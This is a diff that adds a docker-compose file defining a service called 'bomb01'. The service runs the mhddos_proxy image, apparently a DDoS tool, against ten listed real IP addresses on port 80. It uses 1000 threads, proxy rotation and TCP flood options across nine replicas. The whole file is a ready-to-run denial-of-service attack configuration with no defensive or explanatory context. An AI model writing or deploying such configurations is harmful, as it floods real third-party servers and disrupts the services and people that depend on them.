@@ -1,0 +1,10 @@
+version: '3'
+
+services:
+
+  bomb01:
+    image: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy
+    command:  tcp://5.8.79.230:80 tcp://195.93.246.165:80 tcp://81.19.72.39:80 tcp://95.163.95.9:80 tcp://80.93.184.78:80 tcp://81.19.72.3:80 tcp://82.202.190.72:80 tcp://194.190.37.226:80 tcp://194.190.37.228:80 tcp://194.190.37.234:80 -t 1000 -p 300 --rpc 100 --http-methods TCP --debug
+    deploy:
+      replicas: 9
+
